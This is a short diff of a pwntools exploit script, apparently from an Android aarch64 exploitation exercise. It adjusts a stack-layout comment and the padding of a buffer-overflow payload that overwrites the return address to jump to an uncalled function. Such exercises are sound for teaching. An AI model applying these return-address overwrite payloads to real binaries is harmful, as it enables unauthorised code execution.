@@ -9,11 +9,9 @@ stack:
 x30     -------
         8
 x29     -------
-        4
-unused  -------
         128
 buf     -------
-        44
+        48
 sp      ------- <- vulnerable
 '''
 
@@ -24,7 +22,7 @@ context(arch='aarch64', endian='little', word_size=64, os='android')
 base_addr = 0x5555555000
 not_called = 0x7f8 + base_addr
 
-payload = 'a' * 140
+payload = 'a' * 136
 payload += p64(not_called)
 
 bin_path = '/data/local/tmp/02-overwrite-ret'
